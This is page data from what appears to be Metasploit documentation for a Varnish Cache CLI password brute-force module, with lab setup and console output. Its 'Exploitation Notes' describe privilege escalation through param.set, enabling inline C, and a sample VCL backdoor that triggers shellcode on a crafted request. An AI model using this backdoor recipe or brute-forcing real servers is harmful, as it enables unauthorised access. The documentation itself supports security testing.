{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/varnish/varnish_cli_login","result":{"data":{"moduleMetadataJson":{"id":"87c39389-571d-5e9e-bbce-41f02f3d3b40","name":"Varnish Cache CLI Login Utility","fullname":"auxiliary/scanner/varnish/varnish_cli_login","description":"This module attempts to login to the Varnish Cache (varnishd) CLI instance using a bruteforce\n                           list of passwords.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/varnish/varnish_cli_login","documentationSlug":"/modules/documentation/auxiliary/scanner/varnish/varnish_cli_login"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Ubuntu 14.04 can <code class=\"language-text\">apt-get install varnish</code>.  At the time of writing that installed varnish-3.0.5 revision 1a89b1f.\nKali installed varnish-5.0.0 revision 99d036f</p>\n<p>  Varnish installed and ran the cli on localhost.  First lets kill the service: <code class=\"language-text\">sudo service varnish stop</code>.  Now, there are two configurations we want to test:</p>\n<ol>\n<li>No Authentication: <code class=\"language-text\">varnishd -T 0.0.0.0:6082</code>. Varnish 4 and later require either passing '-S \"\"', or may not support unauthenticated mode at all.</li>\n<li>\n<p>Authentication (based on shared secret file): <code class=\"language-text\">varnishd -T 0.0.0.0:6082 -S file</code>.</p>\n<ol>\n<li>I made an easy test one <code class=\"language-text\">echo &quot;secret&quot; &gt; ~/secret</code></li>\n</ol>\n</li>\n</ol>\n<h2 id=\"exploitation-notes\" style=\"position:relative;\"><a href=\"#exploitation-notes\" aria-label=\"exploitation notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation Notes</h2>\n<p>These notes were taken from the original module in EDB, and can be used when developing a working remote exploit</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">- varnishd typically runs as root, forked as unpriv.\n- &#39;param.show&#39; lists configurable options.\n- &#39;cli_timeout&#39; is 60 seconds. param.set cli_timeout 99999 (?) if we want to inject payload into a client thread and avoid being killed.\n- &#39;user&#39; is nobody. param.set user root (may have to stop/start the child to activate)\n- &#39;group&#39; is nogroup. param.set group root (may have to stop/start the child to activate)\n- (unless varnishd is launched with -r user,group (read-only) implemented in v4, which may make priv esc fail).\n- vcc_unsafe_path is on. used to &#39;import ../../../../file&#39; etc.\n- vcc_allow_inline_c is off. param.set vcc_allow_inline_c on to enable code execution.\n- code execution notes:\n\n* quotes must be escaped \\&quot;\n* \\n is a newline\n* C{ }C denotes raw C code.\n* e.g. C{ unsigned char shellcode[] = \\&quot;\\xcc\\&quot;; }C\n* #import &lt;stdio.h&gt; etc must be &quot;newline&quot;, i.e. C{ \\n#include &lt;stdlib.h&gt;\\n dosomething(); }C (without 2x \\n, include statement will not interpret correctly).\n* C{ asm(\\&quot;int3\\&quot;); }C can be used for inline assembly / shellcode.\n* varnishd has it&#39;s own &#39;vcl&#39; syntax. can&#39;t seem to inject C randomly - must fit VCL logic.\n* example trigger for backdoor:\n\nVCL server:\n  vcl.inline foo &quot;vcl 4.0;\\nbackend b { . host = \\&quot;127.0.0.1\\&quot;;  } sub vcl_recv { if (req.url ~ \\&quot;^/backd00r\\&quot;) { C{ asm(\\&quot;int3\\&quot;); }C } } \\n&quot;\n  vcl.use foo\n  start\n\nAttacker:\n  telnet target 80\n  GET /backd00r HTTP/1.1\n  Host: 127.0.0.1\n\n(... wait for child to execute debug trap INT3 / shellcode).\n\nCLI protocol notes from website:\n\nThe CLI protocol used on the management/telnet interface is a strict request/response protocol, there are no unsolicited transmissions from the responding end.\n\nRequests are whitespace separated tokens terminated by a newline (NL) character.\n\nTokens can be quoted with &quot;...&quot; and common backslash escape forms are accepted: (\\n), (\\r), (\\t), (\n), (\\&quot;), (\\%03o) and (\\x%02x)\n\nThe response consists of a header which can be read as fixed format or ASCII text:\n\n    1-3      %03d      Response code\n    4        &#39; &#39;       Space\n    5-12     %8d       Length of body\n    13       \\n        NL character.\nFollowed by the number of bytes announced by the header.\n\nThe Responsecode is numeric shorthand for the nature of the reaction, with the following values currently defined in include/cli.h:\n\nenum cli_status_e {\n        CLIS_SYNTAX     = 100,\n        CLIS_UNKNOWN    = 101,\n        CLIS_UNIMPL     = 102,\n        CLIS_TOOFEW     = 104,\n        CLIS_TOOMANY    = 105,\n        CLIS_PARAM      = 106,\n        CLIS_OK         = 200,\n        CLIS_CANT       = 300,\n        CLIS_COMMS      = 400,\n        CLIS_CLOSE      = 500\n};</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  Example steps in this format:</p>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/varnish/varnish_cli_login</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>Find a valid login.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>PASS_FILE</strong></p>\n<p>  File which contains the password list to use.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  Running against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f and NO AUTHENTICATION</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  resource (varnish.rc)&gt; use auxiliary/scanner/varnish/varnish_cli_login\n  resource (varnish.rc)&gt; set pass_file /root/varnish.list\n  pass_file =&gt; /root/varnish.list\n  resource (varnish.rc)&gt; set rhosts 192.168.2.85\n  rhosts =&gt; 192.168.2.85\n  resource (varnish.rc)&gt; set verbose true\n  verbose =&gt; true\n  resource (varnish.rc)&gt; run\n  [+] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN SUCCESSFUL: No Authentication Required\n  [*] Scanned 1 of 1 hosts (100% complete)\n  [*] Auxiliary module execution completed\n  msf auxiliary(varnish_cli_login) &gt;\n  ```\n\nRunning against Ubuntu 14.04 with varnish-3.0.5 revision 1a89b1f</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">resource (varnish.rc)&gt; use auxiliary/scanner/varnish/varnish_cli_login\nresource (varnish.rc)&gt; set pass_file /root/varnish.list\npass_file =&gt; /root/varnish.list\nresource (varnish.rc)&gt; set rhosts 192.168.2.85\nrhosts =&gt; 192.168.2.85\nresource (varnish.rc)&gt; set verbose true\nverbose =&gt; true\nresource (varnish.rc)&gt; run\n[*] 192.168.2.85:6082     - 192.168.2.85:6082 - Authentication Required\n[!] 192.168.2.85:6082     - No active DB -- Credential data will not be saved!\n[*] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN FAILED: bad\n[*] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN FAILED: good\n[+] 192.168.2.85:6082     - 192.168.2.85:6082 - LOGIN SUCCESSFUL: secret\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"></span></pre></div>"}}},"pageContext":{"id":"87c39389-571d-5e9e-bbce-41f02f3d3b40"}}}